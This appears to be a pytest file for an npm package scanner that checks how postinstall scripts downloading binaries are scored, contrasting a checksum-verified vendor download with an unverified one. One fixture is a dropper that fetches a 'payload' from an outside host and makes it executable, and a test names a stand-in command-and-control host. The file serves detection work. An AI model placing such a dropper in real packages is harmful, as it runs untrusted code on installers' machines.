# SPDX-License-Identifier: AGPL-3.0-or-later
"""Checksum-verified prebuilt-binary download (esbuild/swc/huayoungtk-cli pattern)
must NOT convict as a remote-binary dropper. The static finding is down-weighted, and
the detonation re-score recognizes an install-time connect to the same vendor host as
the legit self-download (not exfil) — while an UNVERIFIED drop, or exfil to a host
unrelated to the download host, still convicts."""
from __future__ import annotations

import json
import pathlib
import tempfile

from pkgsentry.adapter import Finding
from pkgsentry.detonation_worker import _verified_download_hosts, _is_self_download_exfil
from pkgsentry.ecosystems.npm.installer import analyze_install_scripts


def _pkg(install_js: str) -> pathlib.Path:
    d = pathlib.Path(tempfile.mkdtemp()) / "pkg"
    d.mkdir()
    (d / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}})
    )
    (d / "install.js").write_text(install_js)
    return d


_VERIFIED = """
const https=require('https'),fs=require('fs'),crypto=require('crypto');
const url='https://dl.vendor-cdn.com/cli/tool/linux/tool';
https.get(url,r=>{const b=[];r.on('data',c=>b.push(c));r.on('end',()=>{
  fs.writeFileSync('bin/tool',Buffer.concat(b)); fs.chmodSync('bin/tool',0o755);
  const h=crypto.createHash('sha256').update(fs.readFileSync('bin/tool')).digest('hex');
  if(h!==expected){fs.unlinkSync('bin/tool');throw new Error('checksum mismatch');}
})});
"""

_UNVERIFIED = """
const https=require('https'),fs=require('fs');
https.get('https://laogou.us/x/payload',r=>{const b=[];r.on('data',c=>b.push(c));
  r.on('end',()=>{fs.writeFileSync('bin/x',Buffer.concat(b));fs.chmodSync('bin/x',0o755);});});
"""


def _drop(findings):
    return [f for f in findings if f.rule_id == "installer.npm_install_remote_binary_drop"]


def test_checksum_verified_download_is_downweighted():
    f = _drop(analyze_install_scripts(_pkg(_VERIFIED)))
    assert f and f[0].severity == "low", "verified prebuilt-binary download must be down-weighted"
    assert "hosts:" in f[0].evidence


def test_unverified_drop_still_high():
    f = _drop(analyze_install_scripts(_pkg(_UNVERIFIED)))
    assert f and f[0].severity == "high", "an unverified remote-binary drop must stay high"


def test_self_download_connect_is_not_exfil_but_unrelated_host_is():
    static = analyze_install_scripts(_pkg(_VERIFIED))
    vhosts = _verified_download_hosts(static)
    assert vhosts == {"vendor-cdn.com"}
    self_dl = Finding(rule_id="dyn_install_exfil", category="dynamic", severity="high",
                      confidence="high", file="", line=None,
                      evidence="connect to a non-allowlisted host during install phase: dl.vendor-cdn.com (1.2.3.4):443")
    other = Finding(rule_id="dyn_install_exfil", category="dynamic", severity="high",
                    confidence="high", file="", line=None,
                    evidence="connect to a non-allowlisted host during install phase: evil-c2.attacker.net (9.9.9.9):443")
    assert _is_self_download_exfil(self_dl, vhosts) is True    # legit self-download -> dropped
    assert _is_self_download_exfil(other, vhosts) is False     # unrelated host -> still convicts
